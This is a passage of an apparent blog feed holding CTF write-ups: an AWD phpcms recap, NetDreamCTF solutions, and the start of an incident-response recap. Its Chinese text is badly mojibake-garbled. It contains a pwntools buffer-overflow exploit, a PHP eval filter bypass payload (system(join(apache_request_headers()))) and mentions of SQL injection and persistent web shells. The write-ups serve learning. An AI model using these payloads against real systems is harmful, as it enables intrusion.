href="#awdæ€è·¯" class="headerlink" title="awdæ€è·¯"></a>awdæ€è·¯</h3><p>å› ä¸ºæ˜¯ä»awdä¸­é‡åˆ°çš„cmsï¼Œå¦‚ä½•è·å¾—flagï¼Œæäº¤æ‹¿åˆ°åˆ†æ•°æ‰æ˜¯é‡ç‚¹</p><p>èƒ½è·å¾—æœ¬åœ°æ ¹ç›®å½•ä¸‹çš„flagåŸºæœ¬ä¸Šæ˜¯åå°æ¼æ´ä¸ºä¸»</p><h4 id="ç™»é™†å¯¹æŠ—"><a href="#ç™»é™†å¯¹æŠ—" class="headerlink" title="ç™»é™†å¯¹æŠ—"></a>ç™»é™†å¯¹æŠ—</h4><h5 id="ç»´æŠ¤"><a href="#ç»´æŠ¤" class="headerlink" title="ç»´æŠ¤"></a>ç»´æŠ¤</h5><p>è¿æ¥ç›¸åº”çš„æ•°æ®åº“æ›¿æ¢ adminçš„é»˜è®¤å¯†ç pwdå­—æ®µã€æ˜¯å¦åŠ saltã€‘</p><p><img src="/../images/image-20251011151829593.png" alt="image-20251011151829593"></p><h5 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h5><p>å¦‚æœcmsçš„é»˜è®¤å¯†ç è¢«æ”¹äº†çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å‰å°sqlæ³¨å…¥æ¼æ´è·å¾—ç›¸åº”adminçš„pwdå­—æ®µã€ä½†ä¸ä¸€å®šèƒ½å¤Ÿè§£å¯†å‡ºæ¥ã€‘</p><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p>åœ¨awdå½“ä¸­è¦æ”»å‡»çš„ä¸»æœºä¸æ­¢ä¸€å°ï¼Œåœ¨æ²¡æœ‰æƒé™æ§åˆ¶çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¦å¯ä»¥å†™ä¸€ä¸ªæ‰¹é‡ç™»é™†è„šæœ¬è·å¾—cookieã€æ²¡æ¥å¾—åŠéªŒè¯ã€‘ï¼Œä¸ºåé¢æ‰“expè¦éªŒè¯ç®¡ç†å‘˜èº«ä»½åšé“ºå«</p><h4 id="æ¼æ´æ€»ç»“"><a href="#æ¼æ´æ€»ç»“" class="headerlink" title="æ¼æ´æ€»ç»“"></a>æ¼æ´æ€»ç»“</h4><p>åœ¨awdè¿‡ç¨‹å½“ä¸­è¿™ä¸€å¥—cmsçš„æ¼æ´æ‰“å¾—å¤šçš„æ˜¯åˆ é™¤å’Œä¸Šä¼ ã€‚</p><p>åœ¨è¯»å–æ²¡æœ‰è¢«ä¿®çš„æƒ…å†µä¸‹ï¼Œæ•ˆç‡æœ€é«˜ï¼Œåªè¦ç™»é™†åå°ï¼Œæ‰“expå°±å¥½äº†</p><p>æ‰“çš„æ—¶å€™ï¼Œå‘ç°å®¶é‡Œå•¥éƒ½è¢«åˆ æ²¡äº†å’Œå¤šäº†ä¸€å †é©¬å­éƒ½æ˜¯ç—›è‹¦çš„</p><p>æ–‡ä»¶ä¸Šä¼ ç‚¹ä¾æ—§æ˜¯ç»å…¸çš„ä¸€å¥è¯æœ¨é©¬è½¬ä¸æ­»é©¬ï¼Œè¢«æ‰“è¿›æ¥çš„æ—¶å€™ï¼Œè¿˜æ‰¾ä¸åˆ°ç«äº‰è„šæœ¬ï¼Œä¸‹æ¬¡åº”è¯¥å¼€å±€å…ˆæ”¾ä¸Šå»çš„</p><p>è¿™ä¸€æ¬¡çš„ç‚¹å…¨åœ¨åå°ï¼Œæ‰“expè¦æƒé™éªŒè¯ï¼Œæ²¡æ•´è¿‡è¿™ä¸ªç‚¹ï¼Œä»¥è‡³äºåé¢æ‘†çƒ‚æ‹–åè…¿äº†</p><p>ç»´æŠ¤çš„è¯ï¼Œè¿˜æ˜¯æ„Ÿè§‰ä¿®æ”¹é»˜è®¤å¯†ç ï¼ŒåŠ ctf_wafï¼Œæ¯ä¸ªç‚¹æ”¹çš„è¯æ¥ä¸åŠï¼Œä½†æ˜¯è¿™æ¬¡éƒ½æ²¡åŠ ã€ä¸‹æºç ä¸‹äº†20åˆ†é’Ÿã€‘ä¸å˜»å˜»</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™æ¬¡å‘äº†sunå’Œæ¨ä¸˜å¸ˆå‚…ï¼Œæ„Ÿè°¢ä¸æ€ä¹‹æ©ï¼Œæˆ‘ä¸‹ä¸€æ¬¡è‚¯å®šä¼šåšåˆ°çš„ã€åšä¿¡ã€‘</p><p>phpcmsçš„ä»£ç å®¡è®¡ï¼Œå¯»æ‰¾å¯æ§å‚æ•°å˜é‡ï¼Œæœ‰æ²¡æœ‰å‚ä¸å±é™©å‡½æ•°ï¼Œç™½ç›’+é»‘ç›’ä¸€èµ·è¯•ï¼Œæ­å»ºçš„æ—¶å€™æ³¨æ„é…ç½®ï¼Œawdçš„æ—¶å€™ï¼Œè¦å¿«é€Ÿçš„æ‰“expå’Œå†å²æ¼æ´è·å¾—åˆ†æ•°ï¼Œæ³¨æ„å¸¸è§„çš„ç»´æŠ¤ã€‚pwnæ˜¯å †æº¢å‡ºã€ç­‰æˆ‘å†æ²‰æ·€æ²‰æ·€ã€‘</p>]]></content>
      
      
      <categories>
          
          <category> ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°</title>
      <link href="/posts/38132.html"/>
      <url>/posts/38132.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°ï¼ˆéƒ¨åˆ†é¢˜ç›®ï¼‰"><a href="#ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°ï¼ˆéƒ¨åˆ†é¢˜ç›®ï¼‰" class="headerlink" title="ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°ï¼ˆéƒ¨åˆ†é¢˜ç›®ï¼‰"></a>ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°ï¼ˆéƒ¨åˆ†é¢˜ç›®ï¼‰</h2><p>å…¨éƒ¨çš„é¢˜è§£ï¼š<a href="https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw">https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw</a></p><p>å­˜æ¡£ï¼š<a href="https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source">https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source</a></p><p>çº¸è±ªå­¦é•¿çš„è®²è§£ï¼š<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025é¢˜ç›®è®²è§£ ezpwn&amp;ezupload&amp;ezbypass_å“”å“©å“”å“©_bilibili</a></p><p><img src="/../images/image-20250817140400019.png" alt="image-20250817140400019"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ï¼šä½ çŸ¥é“Baseå’ŒTXTå—?Y3RmLmN0Zi52aW4=</span><br></pre></td></tr></table></figure><p>base64è§£ç ä¹‹å txtåŸŸåè§£æè®°å½•</p><p><img src="/../images/image-20250817140706604.png" alt="image-20250817140706604"></p><p><img src="/../images/image-20250817140803070.png" alt="image-20250817140803070"></p><h4 id="I-AM-K"><a href="#I-AM-K" class="headerlink" title="I AM K!"></a>I AM K!</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ï¼š</span><br><span class="line">B3F0reèµµçš„ç«‹æ–¹ä½“-1398441600</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encrypt(plaintext, key):</span><br><span class="line">    key_sum = sum(ord(char) for char in key)</span><br><span class="line">    if not plaintext.startswith(&quot;flag&#123;&quot;):</span><br><span class="line">        plaintext = &quot;flag&#123;&quot; + plaintext</span><br><span class="line">    if not plaintext.endswith(&quot;&#125;&quot;):</span><br><span class="line">        plaintext += &quot;&#125;&quot;</span><br><span class="line">    </span><br><span class="line">    encrypted = []</span><br><span class="line">    for char in plaintext:</span><br><span class="line">        encrypted_char = (ord(char) + key_sum) % 256 </span><br><span class="line">        encrypted.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">    encrypted_bytes = bytes(encrypted)</span><br><span class="line">    base64_encoded = base64.b64encode(encrypted_bytes).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    shift = key_sum % 26</span><br><span class="line">    caesar_shifted = &quot;&quot;</span><br><span class="line">    for char in base64_encoded:</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            shifted_char = chr(((ord(char) - ord(&#x27;A&#x27;) + shift) % 26 + ord(&#x27;A&#x27;))) if char.isupper() else chr(((ord(char) - ord(&#x27;a&#x27;)) + shift) % 26 + ord(&#x27;a&#x27;))</span><br><span class="line">            caesar_shifted += shifted_char</span><br><span class="line">        else:</span><br><span class="line">            caesar_shifted += char</span><br><span class="line">    hex_encoded = caesar_shifted.encode(&#x27;utf-8&#x27;).hex()</span><br><span class="line">    </span><br><span class="line">    return hex_encoded</span><br><span class="line"></span><br><span class="line">key = &quot;xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx&quot;</span><br><span class="line"></span><br><span class="line">plaintext = &quot;Thi5 1s th3 Fl@g&quot; </span><br><span class="line"></span><br><span class="line">ciphertext = encrypt(plaintext, key)</span><br><span class="line">print(ciphertext)</span><br><span class="line"></span><br><span class="line">#686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248</span><br></pre></td></tr></table></figure><p>1.(ASCIIå€¼ + key_sum) % 256</p><p>2.å­—èŠ‚åˆ—è¡¨è½¬æ¢ä¸ºå­—èŠ‚ä¸²ï¼Œå†è¿›è¡Œ Base64 ç¼–ç </p><p>3.å‡¯æ’’ç§»ä½</p><p>4.åå…­è¿›åˆ¶ç¼–ç </p><p>è¿™é‡Œæ˜¯è‡ªå·±çˆ†ç ´å¯†é’¥äº† é¢„æœŸç¡®å®ç²¾å¦™ã€muscã€‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_keysum</span>(<span class="params">ciphertext_hex, key_sum</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Hex decode</span></span><br><span class="line">        ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">        caesar_shifted = ciphertext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse Caesar shift</span></span><br><span class="line">        shift = key_sum % <span class="number">26</span></span><br><span class="line">        base64_encoded = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> caesar_shifted:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():</span><br><span class="line">                <span class="keyword">if</span> char.isupper():</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">                base64_encoded += shifted_char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base64_encoded += char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Base64 decode</span></span><br><span class="line">        encrypted_bytes = base64.b64decode(base64_encoded)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse additive cipher</span></span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_bytes:</span><br><span class="line">            decrypted_char = (byte - key_sum) % <span class="number">256</span></span><br><span class="line">            plaintext += <span class="built_in">chr</span>(decrypted_char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check for &#x27;flag&#123;...&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> plaintext.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> plaintext.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> plaintext</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">ciphertext_hex = <span class="string">&quot;686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute-force key_sum from 0 to 10000</span></span><br><span class="line"><span class="keyword">for</span> key_sum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10001</span>):</span><br><span class="line">    plaintext = decrypt_with_keysum(ciphertext_hex, key_sum)</span><br><span class="line">    <span class="keyword">if</span> plaintext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found key_sum = <span class="subst">&#123;key_sum&#125;</span>, plaintext = <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="ezimg"><a href="#ezimg" class="headerlink" title="ezimg"></a>ezimg</h4><p>è¿™é‡Œåšçš„æ—¶å€™è¢«åšå±€äº† æ²¡çœ‹åˆ°pyæ–‡ä»¶è—çš„ è¿˜æ˜¯å¤ªå•çº¯äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ï¼šç»™äº†å¼ å¥¶é¾™å›¾ç‰‡</span><br></pre></td></tr></table></figure><p>![milkdragon (1)](..&#x2F;images&#x2F;milkdragon (1).jpg)</p><p>ä½¿ç”¨winhexæ‰“å¼€å›¾ç‰‡ï¼Œåœ¨æœ€åæœ‰ä¸¤æ®µçš„base64å¯†æ–‡</p><p><img src="/../images/image-20250817142438533.png" alt="image-20250817142438533"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1GJ411x7h7/</span><br><span class="line">https://docs.qq.com/doc/DZWxobHhmRW9pd09k</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ˜¯çº¯éªšæ‰°</p><p>æ‰“å¼€ç¬¬äºŒä¸ªï¼Œå…¨éƒ¨å¤åˆ¶å‡ºæ¥æœ‰</p><p><img src="/../images/image-20250817142615568.png" alt="image-20250817142615568"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¹¶éflag</span><br><span class="line">flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;</span><br><span class="line">aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==</span><br></pre></td></tr></table></figure><p> å†è§£å¯†æœ‰ä¸€ä¸ªä¸‹è½½é“¾æ¥é‡Œé¢æœ‰ä¸ªå‹ç¼©åŒ…é‡Œé¢æ˜¯ä¸ªpyæ–‡ä»¶</p><p> <img src="/../images/image-20250817142948773.png" alt="image-20250817142948773"></p><p> æ²¡çœ‹åˆ°ä¸‹é¢è¿˜æœ‰ä¸œè¥¿ æ²¡åšå‡ºæ¥</p><p><img src="/../images/image-20250817143016863.png" alt="image-20250817143016863"></p><p> å°†ä¸Šé¢è·å¾—çš„flagæ”¾è¿›å»è§£å¯†å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = base64.urlsafe_b64encode(<span class="string">b&#x27;flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;&#x27;</span>[:<span class="number">32</span>].ljust(<span class="number">32</span>, <span class="string">b&#x27;\0&#x27;</span>)[:<span class="number">32</span>])</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">c=</span><br><span class="line"><span class="string">&quot;gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s&quot;</span></span><br><span class="line">decrypted = cipher.decrypt(c.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:&quot;</span>, decrypted.decode())</span><br></pre></td></tr></table></figure><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h4><p>- </p><p>è¿™é‡Œè´´ä¸€ä¸‹[çº¸è±ª]<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1387.homepage.video_card.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025é¢˜ç›®è®²è§£ ezpwn&amp;ezupload&amp;ezbypass_å“”å“©å“”å“©_bilibili</a>å­¦é•¿~ çš„é“¾æ¥ å£°éŸ³å¾ˆå¸…</p><p> <img src="/../images/image-20250817153655298.png" alt="image-20250817153655298"></p><p> é¢˜ç›®è¿›æ¥è·Ÿè¿›åˆ°vuln</p><p><img src="/../images/image-20250817153729143.png" alt="image-20250817153729143"></p><p> <img src="/../images/image-20250817154009298.png" alt="image-20250817154009298"></p><p> æ˜æ˜¾çš„æ ˆæº¢å‡º æ‰¾åé—¨åœ°å€å’Œåç§»é‡</p><p><img src="/../images/image-20250817154040309.png" alt="image-20250817154040309"></p><p> <img src="/../images/image-20250817154054280.png" alt="image-20250817154054280"></p><p>ä½¿ç”¨cyclicå·¥å…·æµ‹ç®—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br><span class="line">gdb ./pwn</span><br><span class="line">è¾“å…¥ç”Ÿæˆçš„å­—ç¬¦ä¸² çœ‹åˆ°åœåœ¨äº†0x61616174</span><br><span class="line">cyclic -l 0x61616174 å¾—åˆ°åç§»é‡76</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817155853433.png" alt="image-20250817155853433"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./attachment&#x27;)</span><br><span class="line">#p = remote(&quot;127.0.0.1&quot;, 9999)</span><br><span class="line">payload = b&#x27;a&#x27; * 76 + p32(0x080491B6)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817164600305.png" alt="image-20250817164600305"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>webéƒ½æ˜¯dockeræ‹‰ä¸‹æ¥çš„ flagæ˜¯è‡ªå·±å¡«ä¸Šå»çš„ éƒ½ä¸€æ ·çš„ </p><h4 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hintï¼šfuzzéƒ¨åˆ†éœ€è¦çˆ†ç ´http://x.x.x.x/çš„è·¯å¾„ï¼Œå…­ä½æ•°</span><br></pre></td></tr></table></figure><p>è¿›æ¥æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢ æŸ¥çœ‹æºä»£ç  è®¿é—®ä¸‹ä¸€çº§ç›®å½•</p><p><img src="/../images/image-20250824141424090.png" alt="image-20250824141424090"></p><p>è¿›æ¥æç¤ºçˆ†ç ´æ•°å­—ç»„çš„ç›®å½• ä½¿ç”¨burpçˆ†ç ´ä¸€æ‰‹ å…­ä½æ•° </p><p><img src="/../images/image-20250824141505057.png" alt="image-20250824141505057"></p><p><img src="/../images/image-20250824142613374.png" alt="image-20250824142613374"></p><p><img src="/../images/image-20250824142657740.png" alt="image-20250824142657740"></p><p>è·Ÿburpä¸€æ ·çˆ†ç ´å‚æ•°å å½“è®¿é—®name?&#x3D;1çš„æ—¶å€™ å‘ç°é¡µé¢æ›´æ”¹äº† flask+python æ‰“ä¸€å¥—ssti</p><p><img src="/../images/image-20250824142949912.png" alt="image-20250824142949912"></p><p><img src="/../images/image-20250824144022280.png" alt="image-20250824144022280"></p><h4 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h4><p>è¿™æ˜¯ä¸€é¢˜ç»•è¿‡æ»¤rceé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$test</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;oh nonono hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šè¿è¡Œçš„å‘½ä»¤å­—ç¬¦ ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤system å¯ä»¥ç”¨systemæ¥æ‰§è¡Œå‘½ä»¤ å‘ç°è¢«ç¦äº†getallheaders ä½†æ˜¯æœ‰åˆ«åapache_request_headers()çš„å­—ç¬¦å¯ä»¥ä½¿ç”¨ endå¯ä»¥ä½¿ç”¨joinä½¿ç”¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">getallheaders()è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äºApacheï¼ˆapache_request_headers()å’Œgetallheaders()åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äºApacheï¼‰</span><br><span class="line">å½“ç¡®å®šèƒ½å¤Ÿè¿”å›æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æ•°æ®åŒ…æœ€åä¸€è¡ŒåŠ ä¸Šä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œå†ç”¨end()å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä½¿å…¶æ‰§è¡Œï¼Œpayloadï¼š</span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250824153315095.png" alt="image-20250824153315095"></p><p><img src="/../images/image-20250824153733382.png" alt="image-20250824153733382"></p><p>system(join(apache_request_headers()))ï¼›</p><p><img src="/../images/image-20250824154125855.png" alt="image-20250824154125855"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›7æœˆ--å¤ç›˜</title>
      <link href="/posts/3233.html"/>
      <url>/posts/3233.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/1.png"></p><p>è¿™ä¸€æ¬¡æ¯”å…­æœˆé¢˜é‡å¤šäº†ï¼Œå–è¯å’Œåº”æ€¥1æ²¡è¿è´¯ä¸Šï¼Œç”¨äº†å¾ˆå¤šæ—¶é—´åé¢æ²¡åšï¼Œè¿˜å¾—ç»§ç»­æ²‰æ·€</p><p>å­¦ä¹ ä¸€ä¸‹n0o0bç¥çš„wpï¼Œå¤ç›˜ä¸€æ‰‹ï¼š<a href="https://www.n0o0b.com/archives/solar-7">2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ|n0o0bâ€™s blog</a>ã€‚å®˜æ–¹è§£å¯ä»¥å»solarå…¬ä¼—å·é£Ÿå–</p><p>åšå–è¯çš„çš„æ—¶å€™ï¼Œè¿˜æ˜¯ç”¨ volatility2åœ¨ä¹±æ‰¾,ç›¸å¯¹æ¥è¯´lovelymemçœŸæ˜¯å¥½ç”¨ï¼ŒTokeii0ç¥:<a href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a></p><p>æ€»ç»“ï¼šè¦å¾ˆå¤šæ–°çš„çŸ¥è¯†ç‚¹ï¼Œå¾ˆniceï¼Œè‡ªå·±åšçš„æ—¶å€™å’Œå¤ç›˜æ’æŸ¥æ€è·¯ä¸ä¸€æ ·ï¼Œè¿˜æ˜¯å¾—å¤šæ€»ç»“å¤šå­¦ä¹ </p><h2 id="é¢˜ç›®ä¿¡æ¯â€”â€“VOL-EASY"><a href="#é¢˜ç›®ä¿¡æ¯â€”â€“VOL-EASY" class="headerlink" 